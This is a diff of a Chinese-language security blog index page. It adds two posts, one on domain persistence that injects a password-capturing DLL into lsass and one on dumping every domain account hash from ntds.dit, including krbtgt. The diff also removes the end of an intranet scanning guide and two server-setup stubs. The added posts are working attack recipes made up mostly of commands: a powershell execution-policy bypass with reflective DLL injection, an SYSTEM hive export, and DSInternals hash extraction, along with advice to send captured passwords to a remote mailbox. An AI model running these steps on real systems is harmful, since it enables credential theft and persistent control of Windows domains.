@@ -139,6 +139,82 @@
 
     <div class="post-header index">
         <h1 class="title">
+            <a href="/2016/08/16/Hook-PasswordChangeNotify/">
+                维持域管权限的一些简单办法[ Hook PasswordChangeNotify ]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-08-16</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/getdomain/">getdomain</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>可利用 <code>Hook PasswordChangeNotify</code> 的方式,无需重启系统,且能实时记录修改的密码,只要目标机器不重启一般都不会失效,具体方法很简单,首先,准备好 <code>HookPasswordChange.dll</code> 和 <code>Invoke-ReflectivePEInjection.ps1</code> [主要是用它来把我们事先准备好的 HookPasswordChange.dll 注入到 <code>lsass</code> 进程中,这里有点类似劫持的意思],实际渗透中,并不一定非要把它记录在目标系统的本地文件中[记录到的密码默认放在c:\windows\temp\passwords.txt文件中],你也可以尝试直接把记录到的账号发送到远程指定的邮箱中[有人已提供改进过的dll],自己去谷歌找找,应该可以找到,下面是在本地测试的实际效果:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> powershell –<span class="built_in">exec</span> bypass –Command <span class="string">"&amp; &#123;Import-Module 'C:\Invoke-ReflectivePEInjection.ps1';Invoke-ReflectivePEInjection -PEPath C:\HookPasswordChange.dll –procname lsass&#125;"</span></span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/hook dll injection.png" alt=""><br><img src="/img/hook dll injection record pass.png" alt=""><br><img src="/img/hook dll injection record pass fish.png" alt=""><br><img src="/img/hook dll injection record pass res.png" alt=""></p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2016/08/15/powershell-domainhash/">
+                完整导出域内用户hash小记 [powershell离线提取域内所有账户hash]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-08-15</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/domainhash/">domainhash</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">利用 DSInternals PowerShell</div></pre></td></tr></table></figure></p>
+<p>本地测试环境:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">win <span class="number">2012</span>r2</div></pre></td></tr></table></figure></p>
+<p>离线导出环境要求:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Windows PowerShell <span class="number">3</span>+</div><div class="line">.NET Framework <span class="number">4.5</span>+</div></pre></td></tr></table></figure></p>
+<p>支持的系统:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Windows Server <span class="number">2012</span> R2</div><div class="line">Windows Server <span class="number">2008</span> R2</div><div class="line">Windows <span class="number">10</span> <span class="number">64</span>-bit</div><div class="line">Windows <span class="number">8.1</span> <span class="number">64</span>-bit</div><div class="line">Windows <span class="number">7</span> <span class="number">64</span>-bit</div></pre></td></tr></table></figure></p>
+<p>先看下当前系统的powershell版本:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ps &gt; Get-Host <span class="params">| Select-Object Version</span></div></pre></td></tr></table></figure></p>
+<p>放开pwoershell脚本执行限制:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Set-ExecutionPolicy Unrestricted</div></pre></td></tr></table></figure></p>
+<p><img src="/img/powershell domainhash version.png" alt=""><br></p>
+<p>准备好ntds.dit和SYSTEM.hiv文件:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">ntds.dit [可以利用shadowcopy.bat快速获取]</div><div class="line">system.hiv [reg即可获取]</div><div class="line">reg save hklm\system system.hive</div></pre></td></tr></table></figure></p>
+<p>安装,导入DSInternals模块:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">cd DSInternals</div><div class="line">powershell</div><div class="line">Import-Module .\DSInternals</div></pre></td></tr></table></figure></p>
+<p><img src="/img/powershell domainhash ntds system.png" alt=""></p>
+<p>直接导出域内所有用户hash<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$key = Get-BootKey -SystemHivePath <span class="string">"C:\system.hive"</span></div><div class="line">Get-ADDBAccount -All -DBPath <span class="string">"C:\ntds.dit"</span> -BootKey $key <span class="params">| Out-File hash.txt</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/powershell domainhash hashres.png" alt=""></p>
+<p>也可只获取指定账户的详细信息<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$key = Get-BootKey -SystemHivePath <span class="string">"C:\system.hive"</span></div><div class="line">Get-ADDBAccount -DistinguishedName <span class="string">'CN=krbtgt,CN=Users,DC=klionsec,DC=org'</span>  -DBPath <span class="string">'C:\ntds.dit'</span> -BootKey $key</div></pre></td></tr></table></figure></p>
+<p><img src="/img/powershell domainhash krbrgethash.png" alt=""><br></p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
             <a href="/2016/08/14/shadow-copy-hash/">
                 完整导出域内用户hash小记 [vshadow + ShadowCopy + QuarksPwDump]
             </a>
@@ -811,72 +887,6 @@
 <p><br><br>0x13 一点小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;所有的扫描,有条件的情况下务必都在管理员权限下运行,对于内网主机发现,个人平时大概用到的,基本也就这些了,只不过在实际扫的时候,记得线程给的不要太高,一次扫的端口不要过多,如果工具里面自带的有随机扫ip的选项,最好也把它加上,另外,在内网中,理论上来讲,你应该首先瞄准找一些能快速getshell的内网机器,比如,sa,smb,ftp<code>针对linux</code>,能读写的匿名共享等……严禁大规模漫无目的的扫描,当你拿到一台机器以后,马上上去把能抓的密码hash都抓一下,比如,浏览器中的各种密码,本机的hash,常用软件中的各种密码hash等等……,实在不行再上键盘记录,拿到这些密码以后再慢慢拓展其它机器,切记,尽量不要进行长时间大流量的扫描动作<code>基本上我们现在所用的工具报文标志早已被写进各类ids的识别规则里了,尤其是针对nmap的</code>,会在对方系统中留下大批的扫描日志不说,稍微严谨点儿的内网可能会触发报警,甚至直接锁定ip,内网不比web,在web中你也许可以相对放开点去搞,但内网中,务必小心谨慎,权限来之不易,绝对不能让它轻易的掉了,尽你所能的稳住当前机器,另外,在平时的内网渗透中,能用系统自身工具搞定的,尽量都用系统自带的工具来搞<code>其实,系统自己就已经有非常多的渗透工具,可能只是暂时还没有很好的被发掘出来</code>,这一点非常重要,大家从现在开始,也应该尽量养成自己这样的习惯,尽可能的减少使用一些外部工具,越少越好,安全性没法保障的同时,可能实际使用中也并不是很方便,灵活性就更不用说了,尤其在一些比较畸形的内网中,由于种种限制,从远程下工具还是比较困难的,另外,别人的工具很可能有相当一部分工具都是需要自己免杀的<code>单单基于汇编层免杀还是很有限的</code>,如果你不会免杀,这事儿就很麻烦了,毕竟不是源自自己的手,用别人的始终不太放心,所以,有些东西还是大家自己考量吧……这里只是一点个人建议而已,当然,如果你有喜欢逆别人工具的习惯,这里所说的一切,您都可以直接忽略,如果自己不会逆向,还是谨慎点儿好,如果你想更仔细的去观察基于不同协议更底层的扫描细节,用wireshark吧,它绝对是我见过的最牛最实用的渗透工具,是的,没有之一,祝,愉快</p>
 
         </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2016/06/24/Midlamp/">
-                httpd 2.4.27 + php 5.6.31 + mysql 5.5.57 + centOS6.8_x64
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2016-06-24</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/env/">env</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><br></p>
-<p>一、首先,部署apache<br>0x01 还是接着我们之前准备好的系统继续,首先,将所有准备安装的源码包上传至服务器,软件包列表如下:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">apr-1</span><span class="selector-class">.6</span><span class="selector-class">.2</span><span class="selector-class">.tar</span><span class="selector-class">.gz</span></div><div class="line"><span class="selector-tag">apr-util-1</span><span class="selector-class">.6</span><span class="selector-class">.0</span><span class="selector-class">.tar</span><span class="selector-class">.gz</span></div><div class="line"><span class="selector-tag">cronolog-1</span><span class="selector-class">.6</span><span class="selector-class">.2</span><span class="selector-class">.tar</span><span class="selector-class">.gz</span></div><div class="line"><span class="selector-tag">libiconv-1</span><span class="selector-class">.14</span><span class="selector-class">.tar</span><span class="selector-class">.gz</span></div><div class="line"><span class="selector-tag">httpd-2</span><span class="selector-class">.4</span><span class="selector-class">.27</span><span class="selector-class">.tar</span><span class="selector-class">.gz</span></div><div class="line"><span class="selector-tag">mysql-5</span><span class="selector-class">.5</span><span class="selector-class">.57</span><span class="selector-class">.tar</span><span class="selector-class">.gz</span></div><div class="line"><span class="selector-tag">php-5</span><span class="selector-class">.6</span><span class="selector-class">.31</span><span class="selector-class">.tar</span><span class="selector-class">.gz</span></div></pre></td></tr></table></figure></p>
-<p>要最终完成的架构如下:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">httpd</span> 2<span class="selector-class">.4</span><span class="selector-class">.27</span> + <span class="selector-tag">php</span> 5<span class="selector-class">.6</span><span class="selector-class">.31</span> + <span class="selector-tag">mysql</span> 5<span class="selector-class">.5</span><span class="selector-class">.57</span> + <span class="selector-tag">centOS6</span><span class="selector-class">.8_x64</span></div></pre></td></tr></table></figure></p>
-        </div>
-        <a href="/2016/06/24/Midlamp/" class="read-more">Read More</a>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2016/06/23/Midlnmp/">
-                php5.5.38 + mysql-5.5.32 + nginx-1.12.1 + centOS6.8_x64
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2016-06-23</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/env/">env</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><br></p>
-<p>一、首先,部署nginx<br>0x01 依旧接着我们之前准备好的系统继续,首先,将所有准备安装的源码包上传至服务器,软件包列表如下:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">libiconv-1</span><span class="selector-class">.14</span><span class="selector-class">.tar</span><span class="selector-class">.gz</span></div><div class="line"><span class="selector-tag">mysql-5</span><span class="selector-class">.5</span><span class="selector-class">.32-linux2</span><span class="selector-class">.6-x86_64</span><span class="selector-class">.tar</span><span class="selector-class">.gz</span></div><div class="line"><span class="selector-tag">nginx-1</span><span class="selector-class">.12</span><span class="selector-class">.1</span><span class="selector-class">.tar</span><span class="selector-class">.gz</span></div><div class="line"><span class="selector-tag">php-5</span><span class="selector-class">.5</span><span class="selector-class">.38</span><span class="selector-class">.tar</span><span class="selector-class">.gz</span></div></pre></td></tr></table></figure></p>
-<p>此次要实现的大致架构如下:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">php5</span><span class="selector-class">.5</span><span class="selector-class">.38</span> + <span class="selector-tag">mysql-5</span><span class="selector-class">.5</span><span class="selector-class">.32</span> + <span class="selector-tag">nginx-1</span><span class="selector-class">.12</span><span class="selector-class">.1</span> + <span class="selector-tag">centOS6</span><span class="selector-class">.8_x64</span></div></pre></td></tr></table></figure></p>
-        </div>
-        <a href="/2016/06/23/Midlnmp/" class="read-more">Read More</a>
     
 
 </div>
